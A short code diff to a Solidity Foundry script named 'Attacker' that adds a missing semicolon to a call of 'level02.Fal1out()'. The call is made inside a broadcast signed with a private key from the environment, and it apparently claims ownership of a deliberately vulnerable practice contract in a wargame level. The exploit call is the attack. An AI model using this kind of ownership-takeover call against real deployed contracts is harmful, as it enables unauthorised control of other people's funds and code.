@@ -9,7 +9,7 @@ contract Attacker is Script {
 
     function run() public {
       vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-      level02.Fal1out()
+      level02.Fal1out();
       vm.stopBroadcast();
     }
 }
